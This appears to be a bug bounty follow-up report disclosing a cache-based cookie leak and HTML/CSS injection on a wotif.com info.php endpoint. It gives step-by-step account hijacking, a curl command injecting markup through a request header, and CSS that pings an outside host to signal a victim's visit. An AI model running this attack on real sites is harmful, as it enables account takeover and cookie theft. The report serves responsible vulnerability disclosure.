I've found that there is another typo in my initial report - in the payload I've used the 'background' word so Akamai WAF blocks such request. Please ignore it - it was autocorrection.

Described 'Scenario B' from the initial report, i.e. COOKIE leak, may be leveraged to Victim account hijacking.
Here is an updated and detailed scenario:

1. Attacker sends the malicious payload to https://www.wotif.com/vc/blog/info.php:
`
curl -s -H 'X-Hackerone: maskopatol' -H 'Scenario-B: <link href="https://martek.com.pl/scenario_b.css" rel="stylesheet"><div id="back">Ooops, nothing is here.</div>' 'https://www.wotif.com/vc/blog/info.php'
`.
Attacker visits the https://www.wotif.com/vc/blog/info.php and check if payload is applied. If not, then this step need to be repeated in a few minutes. Seems that endpoint https://www.wotif.com/vc/blog/info.php caches the requests for 1h so in the most pessimistic scenario Attacker needs to wait 1h and try again with sending the malicious payload to https://www.wotif.com/vc/blog/info.php.
2. If malicious payload is applied and reflected by affected *info.php* web page, Attacker now waits another 1h or a little bit more. Otherwise the Victim's visit will not be cached by https://www.wotif.com/vc/blog/info.php and attack will not work so make sure about this step.
3. After mentioned time (~1h+) an Attacker convinces the Victim to visit https://www.wotif.com/vc/blog/info.php. Link doesn't look too suspicious so Victim visits it. 
4. Victim visits the web page https://www.wotif.com/vc/blog/info.php
5. Attacker visits the page https://www.wotif.com/vc/blog/info.php just after the Victim's visit and reads the cached Victim's Cookies. Attacker knows that Victim visited the page thanks to malicious CSS payload injected in step 1. Malicious CSS looks as follow:
```
body {
    color: white;
    font-size: 0px;
}

#back {
    color: black;
    font-size: 18px;
    background: url('https://martek.com.pl/logo.svg') no-repeat;
    height: 100px;
    padding-top: 40px;
}

```
Thanks to background logo element an Attacker is able to check if anybody visits the affected *info.php* web page e.g. in the logs of web server (here it is *martek.com.pl* domain which is under my control).
6. Attacker attaches Victim Cookies to his browser and game is over. Victim's account on wotif.com is hijacked.

**I think that my first evaluation this issue as 'low' is inadequate in the light of this scenario. XSS is not needed to get the Victim account. Reflected HTML/CSS injection is good enough. Please reevaluate it according to my CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H  - base score 8.8 or take your own CVSS recalculation.**

**Please note that attack will work even without HTML/CSS injection. It is only used only to lull the victim's vigilance and make the attack more reliable due to using a CSS as side-channel informing about Victim's visit.**

I'm also attaching the video shows that whole process on my private acocunt. I omit steps 1-2 to keep video shorter than an hour. :)
Firefox browser simulates the Victim, logged to wotif.com account. Burp and its browser is an Attacker.{F2201551}
